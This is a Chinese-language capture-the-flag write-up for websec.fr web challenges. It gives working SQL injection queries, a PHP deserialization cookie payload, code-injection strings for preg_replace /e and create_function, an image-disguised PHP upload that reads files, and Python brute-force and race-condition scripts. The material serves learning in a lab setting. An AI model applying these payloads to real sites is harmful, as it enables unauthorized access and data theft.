### level 01

一道SQLite整型注入的题目，找到注入方法后可以查看表结构：

```sqlite
-1 union select name,sql from sqlite_master
```

再尝试

```sqlite
-1 union select username,password from users where id=1
```

即可获取到flag。

### level 02

前一题基础上加了一个双写绕过，不再赘述。

### level 03

这么长的hash值要是能碰撞出来就不是发writeup而是发paper了，所以处理函数一定有问题。首先`password_verify`函数用于验证密码是否和hash值匹配，这里不存在弱类型或是传递数组绕过，只能老老实实让`sha1($flag, fa1se)`和 `sha1($h2)`相等。这里会发现false故意拼写错了，就会被解析成true，在PHP里，`sha1(string, raw)`函数的语法为：

| 参数   | 描述                                                         |
| ------ | ------------------------------------------------------------ |
| string | 必须，规定需要进行运算的字符                                 |
| raw    | 可选，默认为false，函数将返回一个 40 字符长的十六进制字符串，当设置为true时函数将返回一个 20 字节长的二进制字符串（原始二进制格式） |

同时，注意到提供给我们的hash的第二个字节为`0x00`，对应终止符`\0`，所以检验函数不会匹配00后面的内容。

```
Here is the hash of your flag: 7c00249d409a91ab84e3f421c193520d9fb3674b
```

因此，我们只需要找到一个字符的sha1值开头是`7c00`，即可通过验证。

```python
import hashlib

i = 0
while True:
    a = hashlib.sha1(str(i).encode()).hexdigest()
    if a.startswith("7c00"):
        print(i)
        break
    i += 1
#	104610
```

### level 04

提供了源代码，关键代码在

```php
if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}


class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }
    ...
}
```

构造一个简单的反序列化，将base64编码结果填入到cookie中即可拿到flag。

```php
<?php

class SQL
{
    public $query;
    public $conn;

    function __construct()
    {
        $this->query = "SELECT GROUP_CONCAT(password) as username from users;";
        $this->conn = NULL;
    }
}

$inst = new SQL();

echo urlencode(base64_encode(serialize($inst)));
```

### level 05

首先查看关键代码，程序获得我们的输入，并匹配黑名单，因此我们的命令不能使用引号、括号和反引号，用payload绕过即可。

```php
	$q = substr ($_REQUEST['q'], 0, 256);
	$blacklist = implode (["'", '"', '(', ')', ' ', '`']);
	$corrected = preg_replace ("/([^$blacklist]{2,})/ie", 'correct ("\\1")', $q);
```

```
${include_once	$_GET[inc]} ${flag}
```

同时在url中添加`inc=flag.php`。

### level 08

首先可以搜索一下`exif_imagetype()`函数的匹配原理，它会读取文件的第一个字节并检查其签名，只要加上magic字符就绕过了

```php
GIF89a;

<?php
print_r(scandir("."));
?>
```

```php
GIF89a;

<?php
echo file_get_contents('flag.txt');
// show_source('flag.txt')
?>
```

这里可能是禁用了一些命令的回显，测试了system函数看不到输出结果，改用PHP的方法打印路径文件并读取成功拿到了flag。

### level 10

首先查看一下获取flag的方法，需要我们输入一个hash值和一个文件名，如果相等则会访问我们输入的文件名。

```php
<?php
	if (isset ($_REQUEST['f']) && isset ($_REQUEST['hash'])) {
		$file = $_REQUEST['f'];
		$request = $_REQUEST['hash'];

		$hash = substr (md5 ($flag . $file . $flag), 0, 8);

		echo '<div class="row"><br><pre>';
		if ($request == $hash) {
			show_source ($file);
		} else {
			echo 'Permission denied!';
		}
		echo '</pre></div>';
	}
?>
```

注意到这里是弱相等，那么用0e绕过即可，但是怎样使得`$hash`出现0e呢，这里就需要构造文件名，我们需要读取flag.php，在php解析中在前面加/并不会影响解析结果，但会影响md5的结果，这样就有了思路—爆破需要添加的/的次数，直到绕过弱相等即可。

```python
import requests

prefix = "./"
while True:
    r = requests.post("http://websec.fr/level10/index.php", data={
        'hash': "0e12345",
        'f': prefix + 'flag.php'
    })

    if "WEBSEC{" in r.text:
        print(r.text)
        break

    prefix += "/"
```

### level 15

这里进行了函数创建，但并没有运行。查看create_function的官方文档，它会`eval`执行一个function __lambda_func (<fucntion-params>){<function-code>}字符串，我们可以用}提前闭合函数，并在后面注入我们需要执行的命令。

```php
if (isset ($_POST['c']) && !empty ($_POST['c'])) {
    $fun = create_function('$flag', $_POST['c']);
    print($success);
```

```php
echo 123; }; echo $flag; echo phpinfo();//
```

### level 17

程序中有一个函数引入了随机延迟，所以时间攻击无法实现。

> 时间攻击：时间攻击是一种侧信道攻击，通过测量执行某些操作所需的时间，攻击者可以推断出某些信息。例如，通过测量字符串比较操作的执行时间，攻击者可能会推断出部分字符串内容。

```php
function sleep_rand() { /* I wish php5 had random_int() */
        $range = 100000;
        $bytes = (int) (log($range, 2) / 8) + 1;
        do {  /* Side effect: more random cpu cycles wasted ;) */
            $rnd = hexdec(bin2hex(openssl_random_pseudo_bytes($bytes)));
        } while ($rnd >= $range);
        usleep($rnd);
}
```

那唯一的突破口就变成了比较传入的字符和flag是否一致的函数

```php
<?php
if (! strcasecmp ($_POST['flag'], $flag))
	echo '<div class="alert alert-success">Here is your flag: <mark>' . $flag . '</mark>.</div>';   
else
	echo '<div class="alert alert-danger">Invalid flag, sorry.</div>';
?>
```

`strcasecmp`函数的正常使用介绍：https://cloud.tencent.com/developer/article/2051495

接触过PHP弱类型比较题型的同学可能会知道，`strcmp()`和`strcasecmp()`函数用于比较两个字符串，前者区分大小写。这两个函数都无法处理数组，当传入数组时，返回null。所以，只需要使用POST方法传递一个`flag[]=1`即可绕过比较。

### level 25

尝试了php伪协议和通配符绕过的方法都没有成功，搜索也没有发现`stripos`函数有什么绕过方法，只能换一个思路搜索`parse_str`函数的相关问题，得知如果将正常url中的/替换成///，就会触发解析错误，返回false，就会跳过匹配过程。

> 参考：https://www.freebuf.com/sectool/165452.html

```php
<?php
parse_str(parse_url($_SERVER['REQUEST_URI'])['query'], $query);
foreach ($query as $k => $v) {
	if (stripos($v, 'flag') !== false)
		die('You are not allowed to get the flag, sorry :/');
}
include $_GET['page'] . '.txt';
?>
```

所以只要将网址改为

```php
http://websec.fr///level25///index.php?page=flag
```

### level 28

主要是理解源代码，我们可以任意传一个php文件，在php文件里写读flag的内容即可，但这里程序`sleep(1)`之后就会失效，所以要立刻访问它，由于网络限制手工操作肯定是不行的，写一个自动访问的python脚本就可以解决问题。

```php
<?php
if(isset($_POST['submit'])) {
  if ($_FILES['flag_file']['size'] > 4096) {
    die('Your file is too heavy.');
  }
  $filename = './tmp/' . md5($_SERVER['REMOTE_ADDR']) . '.php';

  $fp = fopen($_FILES['flag_file']['tmp_name'], 'r');
  $flagfilecontent = fread($fp, filesize($_FILES['flag_file']['tmp_name']));
  @fclose($fp);

    file_put_contents($filename, $flagfilecontent);
  if (md5_file($filename) === md5_file('flag.php') && $_POST['checksum'] == crc32($_POST['checksum'])) {
    include($filename);  // it contains the `$flag` variable
    } else {
        $flag = "Nope, $filename is not the right file, sorry.";
        sleep(1);  // Deter bruteforce
    }

  unlink($filename);
}
?>
```

**exp.php:**

```php
<?php
include("../flag.php");
echo $flag;
?>
```

**exp.py:**

```python
import requests
import time

md5ip=

URL = "https://websec.fr/level28/tmp/"
FILE = f"{md5ip}.php"

while True:
    res = requests.get(f"{URL}/{FILE}")
    if res.status_code != 404:
        print(res.text)
    else:
        print("NOPE")
    time.sleep(0.1)
```

运行python脚本的同时不断上传php文件，就可以在终端看到打印出的flag信息了。